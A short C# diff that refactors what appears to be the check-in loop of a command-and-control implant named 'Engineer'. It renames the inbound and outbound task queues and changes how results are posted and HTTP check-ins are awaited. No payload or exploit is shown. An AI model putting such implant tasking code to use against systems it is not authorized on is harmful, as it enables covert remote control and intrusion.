@@ -159,22 +159,22 @@ namespace Engineer
 
 
                         //send task output
-                        if (!_commModule.Outbound.IsEmpty)
+                        if (!_commModule.OutboundTaskResults.IsEmpty)
                         {
-                           await Task.Run(() =>_commModule.PostData());   //send task response data to server
+                           await _commModule.PostData();   //send task response data to server
                         }
                         //http checkin with server
                         else if (ManagerType.Equals("http", StringComparison.CurrentCultureIgnoreCase) || ManagerType.Equals("https", StringComparison.CurrentCultureIgnoreCase))
                         {
-                           await Task.Run(() => _commModule.CheckIn());      
+                           await _commModule.CheckIn();      
                         }
                         //if we got new tasking process it
-                        if(!_commModule.Inbound.IsEmpty)
+                        if(!_commModule.InboundTasks.IsEmpty || !_commModule.InboundNotifs.IsEmpty)
                         {
                             await _commModule.CheckForDataProcess();
                         }
                         //check a second time if we should be responding with a task result
-                        if (!_commModule.Outbound.IsEmpty)
+                        if (!_commModule.OutboundTaskResults.IsEmpty)
                         {
                             await Task.Run(() => _commModule.PostData());   //send task response data to server
                         }
